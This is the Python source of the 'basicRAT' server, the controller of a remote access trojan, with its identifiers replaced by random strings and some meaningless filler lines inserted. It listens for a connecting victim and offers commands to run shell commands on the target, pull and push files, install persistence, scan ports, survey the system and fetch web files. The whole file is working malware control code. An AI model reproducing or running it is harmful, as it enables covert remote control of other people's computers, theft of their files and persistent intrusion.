#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import fKVDYrzdKZVcijwKGIciPJNJhgUGEXQd,tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq,LECdLVZAGyQcqbGIHqDblBKNeiBWnwkS
    from core.filesock import rmKLLEJCqgoJgOaymQmnoOotvYFjGJwt, gKBMfnwhSSxqoYgKzwEAFFmdZUXetvKm
except ImportError as ucOmuZOuIhcXiuGPmcTSVoQyNPAoiLVT:
    print ucOmuZOuIhcXiuGPmcTSVoQyNPAoiLVT
    sys.exit(0)
fBFMXPkFhRsMwVfavLaeVLaBCtObvxYU = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
ZEqKjboNHAjmtamGPAqEnkElbMWQDQpw = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
azAiPOmkjPpjlcgiBZgfNcbVdKsvRQwA = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
YopGjcWpJhdcJWgVdSuxsgzfFubXFENz = """a""" + "HELP_TEXT"
TSkKPgMdhkGmiHkMRGsgFOZMcoVSxjPr = '''HELP_TEXT''' + fBFMXPkFhRsMwVfavLaeVLaBCtObvxYU + '''COMMANDS'''
xKaySiosLXritbbtrgdBDAfGCAUeCWox = "COMMANDS"
HJIwTiRZLSIWRIhcMtcMKGHfdGXsynlt = 'HELP_TEXT' + 'COMMANDS' + "HELP_TEXT"
def FtAfMfvHhXEzeGBuNfxzOXLChYTZYmSK():
    ZuDhBXqoxNFxpcvPPBFXJLQgrzTgRyiA = argparse.ArgumentParser(description='basicRAT server')
    ZuDhBXqoxNFxpcvPPBFXJLQgrzTgRyiA.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return ZuDhBXqoxNFxpcvPPBFXJLQgrzTgRyiA
def ThNKxdOlSPpmNoThVeJUkJGaWBFnAcAK():
    wEwupTvXJKepdnRQPbvCYyVrNoUAaAiz = 'BrFjUydOqRRyvnwarPCWMOnoHUeNyVKW'
class nXCJYajRoAbBHYGgcglWWwSnsarKbYAM:
    IIiKYFScCZtyLilCBOwKshDkWaKjpeeg = 'ALnbUJWwUqhQFvARoHLKQfaAbPiOJaKO'
def AIFsrozZCqmWETKOCZVZEkGBgdjHQRWl():
    ZuDhBXqoxNFxpcvPPBFXJLQgrzTgRyiA  = FtAfMfvHhXEzeGBuNfxzOXLChYTZYmSK() 
    ABCMsASkfwifBxbIjglsjFueCMcwvfuy    = vars(ZuDhBXqoxNFxpcvPPBFXJLQgrzTgRyiA.parse_args()) 
    HDdhZYtKlAiqjWOYyHirtafwsDJbivtV    = ABCMsASkfwifBxbIjglsjFueCMcwvfuy['port'] 
    print("# test") 
    hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.bind(('0.0.0.0', HDdhZYtKlAiqjWOYyHirtafwsDJbivtV))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(HDdhZYtKlAiqjWOYyHirtafwsDJbivtV)
        sys.exit(1)
    for kmzYxotySyUziTnKRJDkyKUWsmAHXRQk in ZEqKjboNHAjmtamGPAqEnkElbMWQDQpw.split('\n'):
        time.sleep(0.05)
        print kmzYxotySyUziTnKRJDkyKUWsmAHXRQk
    print 'basicRAT server listening on port {}...'.format(HDdhZYtKlAiqjWOYyHirtafwsDJbivtV)
    hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.listen(10)
    vuarcqnkYalDxYFwjzKusJelsVjVsqkj, ZzTyXmSVrgssbIAMcaqPZdeZToIzAySy = hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.accept()
    HRVsYDaowExNJmhzSYkosedOJuOiUyNV = LECdLVZAGyQcqbGIHqDblBKNeiBWnwkS(vuarcqnkYalDxYFwjzKusJelsVjVsqkj, server=True)
    while True:
        YBUGiLSIPYoHpGTLOqUNlkKxDjaDcFyX = raw_input('\n[{}] basicRAT> '.format(ZzTyXmSVrgssbIAMcaqPZdeZToIzAySy[0])).rstrip()
        if not YBUGiLSIPYoHpGTLOqUNlkKxDjaDcFyX:
            continue
        uOGCjvxCoZgwanneHIIgovUCPFSerqXc, _, action = YBUGiLSIPYoHpGTLOqUNlkKxDjaDcFyX.partition(' ')
        if uOGCjvxCoZgwanneHIIgovUCPFSerqXc not in azAiPOmkjPpjlcgiBZgfNcbVdKsvRQwA:
            print 'Invalid command, type "help" to see a list of commands.'
            continue
        if uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'help':
            print fBFMXPkFhRsMwVfavLaeVLaBCtObvxYU
            continue
        vuarcqnkYalDxYFwjzKusJelsVjVsqkj.send(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(YBUGiLSIPYoHpGTLOqUNlkKxDjaDcFyX, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
        if uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'quit':
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.close()
            sys.exit(0)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'run':
            DCfHzJXJudACTpKZoRrLaSbWKENESwsz = vuarcqnkYalDxYFwjzKusJelsVjVsqkj.recv(4096)
            print fKVDYrzdKZVcijwKGIciPJNJhgUGEXQd(DCfHzJXJudACTpKZoRrLaSbWKENESwsz, HRVsYDaowExNJmhzSYkosedOJuOiUyNV).rstrip()
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'download':
            for UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl in action.split():
                UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl = UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl.strip()
                rmKLLEJCqgoJgOaymQmnoOotvYFjGJwt(vuarcqnkYalDxYFwjzKusJelsVjVsqkj, UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'upload':
            for UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl in action.split():
                UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl = UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl.strip()
                gKBMfnwhSSxqoYgKzwEAFFmdZUXetvKm(vuarcqnkYalDxYFwjzKusJelsVjVsqkj, UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'rekey':
            HRVsYDaowExNJmhzSYkosedOJuOiUyNV = LECdLVZAGyQcqbGIHqDblBKNeiBWnwkS(vuarcqnkYalDxYFwjzKusJelsVjVsqkj, server=True)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(uOGCjvxCoZgwanneHIIgovUCPFSerqXc)
            DCfHzJXJudACTpKZoRrLaSbWKENESwsz = vuarcqnkYalDxYFwjzKusJelsVjVsqkj.recv(1024)
            print fKVDYrzdKZVcijwKGIciPJNJhgUGEXQd(DCfHzJXJudACTpKZoRrLaSbWKENESwsz, HRVsYDaowExNJmhzSYkosedOJuOiUyNV)
if __name__ == '__main__':
    AIFsrozZCqmWETKOCZVZEkGBgdjHQRWl()
